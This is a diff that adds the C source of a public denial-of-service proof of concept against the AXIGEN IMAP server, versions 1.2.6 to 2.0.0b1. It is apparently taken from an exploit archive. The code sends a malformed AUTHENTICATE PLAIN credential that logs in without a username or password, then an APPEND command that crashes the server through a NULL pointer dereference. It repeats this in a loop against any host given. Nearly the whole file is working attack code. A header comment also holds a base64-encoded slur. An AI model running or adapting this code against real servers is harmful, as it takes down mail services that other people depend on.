@@ -1,0 +1,215 @@
+/* doaxigen-v2.c
+ *
+ * axigen 1.2.6 - 2.0.0b1 DoS (x86-lnx)
+ * by mu-b - Sun Oct 29 2006
+ *
+ * - Tested on: AXIGEN 1.2.6 (lnx)
+ *              AXIGEN 2.0.0b1 (lnx)
+ *
+ * parsing error results in login without username & password!
+ * which in turn causes a NULL pointer dereference..
+ */
+
+/* dGFicyBhcmUgZm9yIGZhZ2dvdHNcIQ== */
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <netinet/in.h>
+#include <netdb.h>
+#include <sys/time.h>
+#include <sys/types.h>
+
+#define BUF_SIZE    1024
+#define BBUF_SIZE   BUF_SIZE/3*4+1
+
+#define AUTH_CMD    "1 AUTHENTICATE PLAIN\r\n"
+#define APPEND_CMD  "2 APPEND digit-labs\r\n"
+
+#define DEF_PORT    143
+#define PORT_IMAPD  DEF_PORT
+
+#define RCNT_DELAY  3
+
+static const char base64tab[] =
+  "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+
+static int base64 (const u_char * ibuf, u_char * obuf, size_t n);
+static int sock_send (int sock, u_char * src, int len);
+static int sock_recv (int sock, u_char * dst, int len);
+static void zhammer (u_char * host);
+
+static int
+base64 (const u_char * ibuf, u_char * obuf, size_t n)
+{
+  int a, b, c;
+  int i, j;
+  int d, e, f, g;
+
+  a = b = c = 0;
+  for (j = i = 0; i < n; i += 3)
+    {
+      a = (u_char) ibuf[i];
+      b = i + 1 < n ? (u_char) ibuf[i + 1] : 0;
+      c = i + 2 < n ? (u_char) ibuf[i + 2] : 0;
+
+      d = base64tab[a >> 2];
+      e = base64tab[((a & 3) << 4) | (b >> 4)];
+      f = base64tab[((b & 15) << 2) | (c >> 6)];
+      g = base64tab[c & 63];
+
+      if (i + 1 >= n)
+        f = '=';
+      if (i + 2 >= n)
+        g = '=';
+
+      obuf[j++] = d, obuf[j++] = e;
+      obuf[j++] = f, obuf[j++] = g;
+    }
+
+  obuf[j++] = '\0';
+
+  return strlen (obuf);
+}
+
+static int
+sock_send (int sock, u_char * src, int len)
+{
+  int sbytes;
+
+  sbytes = send (sock, src, len, 0);
+
+  return (sbytes);
+}
+
+static int
+sock_recv (int sock, u_char * dst, int len)
+{
+  int rbytes;
+
+  rbytes = recv (sock, dst, len, 0);
+  if (rbytes >= 0)
+    dst[rbytes] = '\0';
+
+  return (rbytes);
+}
+
+static int
+sockami (u_char * host, int port)
+{
+  struct sockaddr_in address;
+  struct hostent *hp;
+  int sock;
+
+  fflush (stdout);
+  if ((sock = socket (AF_INET, SOCK_STREAM, 0)) == -1)
+    {
+      perror ("socket()");
+      exit (-1);
+    }
+
+  if ((hp = gethostbyname (host)) == NULL)
+    {
+      perror ("gethostbyname()");
+      exit (-1);
+    }
+
+  memset (&address, 0, sizeof (address));
+  memcpy ((char *) &address.sin_addr, hp->h_addr, hp->h_length);
+  address.sin_family = AF_INET;
+  address.sin_port = htons (port);
+
+  if (connect (sock, (struct sockaddr *) &address, sizeof (address)) == -1)
+    {
+      perror ("connect()");
+      exit (EXIT_FAILURE);
+    }
+
+  return (sock);
+}
+
+static void
+zhammer (u_char * host)
+{
+  int sock;
+  u_int i;
+  u_char *md5 = "*\x00";  /* what was that? */
+  u_char sbuf[BBUF_SIZE], *sptr;
+  u_char rbuf[BUF_SIZE];
+
+  fd_set r_fds;
+  struct timeval tv;
+
+  base64 (md5, sbuf, strlen (md5)+1);
+  sptr = sbuf + strlen (sbuf);
+  *sptr++ = '\r', *sptr++ = '\n', *sptr = '\0';
+
+  for (i = 0; i < -1; i++)
+    {
+      int rbytes;
+
+      printf ("+Connecting to %s:%d. ", host, PORT_IMAPD);
+      sock = sockami (host, PORT_IMAPD);
+      rbytes = sock_recv (sock, rbuf, sizeof (rbuf) - 1);
+      if (rbytes < 0)
+        return;
+
+      sock_send (sock, AUTH_CMD, strlen (AUTH_CMD));
+      rbytes = sock_recv (sock, rbuf, sizeof (rbuf) - 1);
+      if (rbytes < 0)
+        break;
+
+      sock_send (sock, sbuf, strlen (sbuf));
+      rbytes = sock_recv (sock, rbuf, sizeof (rbuf) - 1);
+      if (rbytes < 0)
+        break;
+
+      if (!strcmp (rbuf, "1 OK Done AUTHENTICATE"))
+        {
+          printf ("+Bah not vulnerable\n");
+          exit (EXIT_SUCCESS);
+        }
+
+      sock_send (sock, APPEND_CMD, strlen (APPEND_CMD));
+
+      FD_ZERO (&r_fds);
+      FD_SET (sock, &r_fds);
+      tv.tv_sec = 2;            /* wait 2 seconds */
+      tv.tv_usec = 0;
+
+      rbytes = select (sock + 1, &r_fds, NULL, NULL, &tv);
+      if (rbytes == -1)         /* oh dear */
+        perror ("select()");
+      else if (rbytes > 1)          /* read response */
+        {
+          printf ("+Bah not vulnerable %d\n", rbytes);
+          exit (EXIT_SUCCESS);
+        }
+
+      /* timeout, server appears to have crashed!@$%! */
+
+      printf ("Wh00t\n");
+      fflush (stdout);
+      sleep (RCNT_DELAY);
+    }
+}
+
+int
+main (int argc, char **argv)
+{
+  printf ("axigen 1.2.6 - 2.0.0b1 DoS POC\n"
+          "by: <mu-b@digit-labs.org>, <mu-b@65535.com>\n\n");
+
+  if (argc <= 1)
+    {
+      fprintf (stderr, "Usage: %s <host>\n", argv[0]);
+      exit (EXIT_SUCCESS);
+    }
+
+  zhammer (argv[1]);
+
+  return (EXIT_SUCCESS);
+}
+
+// milw0rm.com [2007-02-08]
